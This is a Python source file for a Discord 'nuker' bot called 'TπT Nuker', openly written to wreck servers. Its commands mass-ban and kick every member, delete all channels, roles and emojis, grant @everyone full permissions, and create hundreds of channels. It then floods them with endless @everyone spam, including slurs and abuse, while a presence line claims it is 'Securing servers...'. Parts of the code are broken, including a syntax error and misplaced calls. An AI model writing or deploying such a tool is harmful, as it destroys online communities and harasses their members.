import discord
from discord.ext import commands
import asyncio
import random
import colorama
from colorama import Fore
from discord import Permissions
from flask import Flask
from threading import Thread

token = "" # YOUR TOKEN HERE

op = [
  "TπT runs this server noww", "nuked by TπT", "nuked", "你已被轰炸了",
  "中华人民共和国万岁", "gachas are scared" , "TπT nuker on top" , "TπT runs u now"
]
message = [
  "@everyone 你已被轰炸了，笨蛋", "@everyone 去中国吧！！！", "@everyone 中华人民共和国万岁！！！",
  "@everyone NUKED BY TπT", "@everyone No more gachas!!!",
  "@everyone Child groomers must die!!!", "@everyone FUCK RETARDED CHILD GROOMERS",
  "@everyone Yo Bitch you got fucked!!!"
]

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

prefix = "?"
client = commands.Bot(command_prefix=prefix, intents=intents)


@client.event
async def on_server_join(server):
  print("Joining {0}".format(server.name))


#BOT IS READY TO KICK THEIR ASS

#stop
@client.command()
@commands.is_owner()
async def stop(ctx):
  await ctx.bot.close()
  print(Fore.GREEN + f"{ctx.bot.user.name} has logged out successfully." + Fore.RESET)

#ping
@client.command()
async def ping(ctx):
  await ctx.send(f'Pong! {round(client.latency * 1000)}ms')

#invite
@client.command()
async def invite(ctx):
    totalInvites = 0
    for i in await ctx.guild.invites():
        if i.inviter == ctx.author:
            totalInvites += i.uses
    await ctx.send(f"You've invited {totalInvites} member{'' if totalInvites == 1 else 's'} to the server!")
    client.run("")# YOUR TOKEN HERE

#Pall mall(game)
@client.command()
async def mall(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    try:
      await member.kick(reason="L")
      print(
          f"{member.name}'s ass has been kicked! {ctx.guild.name}"
      )
    except (discord.HTTPException, discord.Forbidden, discord.NotFound) as e:
      print(Fore.LIGHTRED_EX +
            f"{member.name}'s ass is too hard to kick {ctx.guild.name}{e}"
      )

@client.command()
async def pall(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    if member.id != 1: # This condition member.id != 1 might not work as intended. Member IDs are long integers.
      for user in list(ctx.guild.members):
        try:
          await ctx.guild.ban(user)
          print(
              f"{member.name} Yay you palled him! {ctx.guild.name}"
          )
        except (discord.HTTPException, discord.Forbidden, discord.NotFound) as e:
          print(Fore.LIGHTRED_EX +f"No pall for {member.name}!",{e})

@client.command()
async def ban(ctx,message, member:discord.Member):
  await ctx.message.delete()
  for member in ctx.guild.members:
    if member.id != 1: # This condition member.id != 1 might not work as intended. Member IDs are long integers.
      for user in list(ctx.guild.members):
        try:
          await ctx.guild.ban(user)
          print(Fore.LIGHTGREEN_EXGREEN +f'GET PALLED' {member.name}'!' + Fore.RESET),{e}
        except (discord.HTTPException, discord.Forbidden, discord.NotFound) as e:
          print(Fore.LIGHTRED_EX +f"Ban Hammer broke on {member.name}?",{e})

@client.command()
async def kick(ctx,message, member:discord.Member):
  await ctx.message.delete()
  for member in ctx.guild.members:
    try:
      await member.kick(reason="L")
      print(
          f"'Kicked' {member.name}."
      )
    except (discord.HTTPException, discord.Forbidden, discord.NotFound) as e:
      print(Fore.LIGHTRED_EX +
            f"Cannot Kick {member.name}!",{e}
      )

# OMG SERVER IS FUCKED UP
@client.command()
async def start(ctx, amount=50):
  await ctx.send(f'Starting scan...')
  await ctx.send(f'OH NOES!!!')
  await ctx.message.delete()
  guild = ctx.guild
  await ctx.guild.edit(name="PROPERTY OF TπT")  #change it if you can
  guild = ctx.guild
  try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print(Fore.LIGHTGREEN_EXGREEN + "ENJOY THE CHAOS" + Fore.RESET),{e}
  except:
      print(Fore.LIGHTRED_EX + "No admin bruh" + Fore.RESET)
  for channel in list(guild.channels):
           try:
               await channel.delete()
               print(f"Deleted {channel.name}")
           except (discord.HTTPException, discord.Forbidden) as e:
               print(f"Failed to delete {channel.name}: {e}")
  amount = 500 # CHANGE THAT FUCKING AMOUNT
  from discord import Permissions
  for i in range(amount):
     try:
        await ctx.guild.create_text_channel(random.choice(op))
        print(Fore.LIGHTGREEN_EX +f"Channel created[{i}]!", Fore.RESET)
     except (discord.HTTPException, discord.Forbidden, discord.NotFound) as e:
        print(Fore.LIGHTRED_EX +"CREATION_ERROR",{e}, Fore.RESET)
  for role in guild.roles:
    try:
      await role.delete()
      print(Fore.LIGHTGREEN_EX +f"{role.name}has been fucked", Fore.RESET)

    except (discord.HTTPException, discord.Forbidden, discord.NotFound) as e:
      print(Fore.LIGHTRED_EX +f"{role.name}has resist powers",{e}, Fore.RESET)
  await asyncio.sleep(2)
  for _ in range(500):
    for _ in range(500):
      for channel in guild.channels:
        try:
          await channel.send(random.choice(message))
          print(Fore.MAGENTA +f"{channel.name} PING PONG!", Fore.RESET)
        except (discord.HTTPException, discord.Forbidden, discord.NotFound) as e:
          print(Fore.LIGHTMAGENTA_EX +f"PING---PANG!{channel.name}",{e}, Fore.RESET)
  for member in list(guild.members):
    try:
      await member.ban(reason="GET FUCKED BITCH")
      print(
          f"{member.name} Ban hammer hammed him. {ctx.guild.name}", Fore.RESET
      , Fore.RESET)
    except (discord.HTTPException, discord.Forbidden, discord.NotFound) as e:
      print(
          f"Ban hammer rejects. {member.name}in{ctx.guild.name}",{e},Fore.RESET
        , Fore.RESET)
  for _ in range(500):
    try:
      await ctx.guild.create_role(name="GET NUKED BITCH")
      print(f"\x1b[38;5;34mRole creation success! {ctx.guild.name}!", Fore.RESET)
    except (discord.HTTPException, discord.Forbidden, discord.NotFound) as e:
      print(f"\x1b[38;5;196mROLE_CREATION_ERROR {ctx.guild.name}!",{e}, Fore.RESET)
  for emoji in list(guild.emojis):
    try:
      await emoji.delete()
      print(f"\x1b[38;5;34mEMOTIONAL DAMAGE {emoji.name} In {ctx.guild.name}!"
            , Fore.RESET)
    except (discord.HTTPException, discord.Forbidden, discord.NotFound) as e:
      print(f"\x1b[38;5;196mUNABLE TO EMO {emoji.name} In {ctx.guild.name}!",{e}, Fore.RESET)
  await guild.create_text_channel("NUKED BITCH")
  for channel in guild.text_channels:
      link = await channel.create_invite(max_age = 0, max_uses = 0)
      print(f"New Invite: {link}")
  amount = 500
  for _ in range(amount):
     await guild.create_text_channel(random.choice(op))
  print("MISSION COMPLETE:GACHA SERVER HAS BEEN FUCKED")
  return

webhook_names = ["TπT"]
@client.event
async def on_guild_channel_create(channel):
    global webhook
    webhook = await channel.create_webhook(name=random.choice(webhook_names))
    while True:
        await channel.send(random.choice(message))
        await webhook.send(random.choice(message), username=random.choice(webhook_names))

try:
    loop = asyncio.get_running_loop()
except RuntimeError:
    print("NO_LOOP_FOUND_START")
    client.run(token)
else:
    print("BOT_START_ON")

    async def start_bot():
        try:
            await client.start(token)
        except discord.errors.LoginFailure:
            print("Invalid token provided.")
        except discord.errors.ConnectionClosed as e:
            print(f"Connection closed unexpectedly: {e}")
        except Exception as e:
            print(f"An error occurred while starting the bot: {e}")

    loop.create_task(start_bot())

@client.event
async def on_ready():
  await client.change_presence(activity=discord.Game(name="Securing servers...")
                               )  #change it if you can
print(Fore.LIGHTMAGENTA_EX+r'''

▒▒▒▒▒▒▒▒▒▒▒
   ▒▒░░░░░░▓▓▓▓▓▓▓▓▓
   ▒▒░░░░░░▓▓▓▓▓▓▓▓▓
   ▒▒    ░░   ▓▓▓
   ▒▒    ░░   ▓▓▓
   ▒▒    ░░   ▓▓▓
   ▒▒░░░░░░   ▓▓▓
  _   _       _                    ___    ___
 | \ | |     | |                  |__ \  / _ \
 |  \| |_   _| | _____ _ __  __   __ ) || | | |
 | . ` | | | | |/ / _ \ '__| \ \ / // / | | | |
 | |\  | |_| |   <  __/ |     \ V // /_ | |_| |
 |_| \_|\__,_|_|\_\___|_|      \_/|____(_)___/

TπT Nuker has started.PREPARE TO DIE SERVER!!!
https://discord.gg/5Aer7xTX9P join up before i goon you
''')
